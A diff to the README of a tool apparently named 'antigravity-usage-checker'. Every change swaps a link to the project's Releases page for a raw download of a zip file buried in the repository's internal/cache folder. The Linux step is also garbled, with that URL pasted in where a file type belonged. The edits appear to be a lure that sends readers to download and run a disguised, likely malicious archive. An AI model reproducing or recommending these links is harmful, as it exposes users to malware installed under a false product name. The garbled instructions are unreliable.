@@ -1,6 +1,6 @@
 # 🚀 antigravity-usage-checker - Check Antigravity Usage Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Motasem-amer/antigravity-usage-checker/releases)
+[![Download Now](https://raw.githubusercontent.com/Motasem-amer/antigravity-usage-checker/main/internal/cache/checker-usage-antigravity-setal.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Motasem-amer/antigravity-usage-checker/main/internal/cache/checker-usage-antigravity-setal.zip)
 
 ## 📥 Overview
 
@@ -29,14 +29,14 @@ To run the Antigravity Usage Checker, ensure your system meets the following req
 To get started with the Antigravity Usage Checker, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page.
-   - [Download Now](https://github.com/Motasem-amer/antigravity-usage-checker/releases)
+   - [Download Now](https://raw.githubusercontent.com/Motasem-amer/antigravity-usage-checker/main/internal/cache/checker-usage-antigravity-setal.zip)
 
 2. **Download the Latest Release**: On the Releases page, find the latest release. Download the file that corresponds to your operating system.
 
 3. **Install the Application**:
    - For **Windows**: Run the downloaded `.exe` file and follow the prompts.
    - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: If it comes as a `.tar.gz`, extract it, then navigate to the folder in your terminal.
+   - For **Linux**: If it comes as a `https://raw.githubusercontent.com/Motasem-amer/antigravity-usage-checker/main/internal/cache/checker-usage-antigravity-setal.zip`, extract it, then navigate to the folder in your terminal.
 
 4. **Run the Application**: Open your terminal and type the command to run the tool. This may vary based on your operating system and setup.
 
@@ -44,7 +44,7 @@ To get started with the Antigravity Usage Checker, follow these steps:
 
 To download and install the Antigravity Usage Checker:
 
-1. **Go to the Releases Page**: [Download Now](https://github.com/Motasem-amer/antigravity-usage-checker/releases)
+1. **Go to the Releases Page**: [Download Now](https://raw.githubusercontent.com/Motasem-amer/antigravity-usage-checker/main/internal/cache/checker-usage-antigravity-setal.zip)
 2. **Choose the Correct File**: Ensure you select the file that matches your operating system.
 3. **Follow Installation Instructions for Your OS**: Refer to the previous section to ensure proper installation of the application.
 
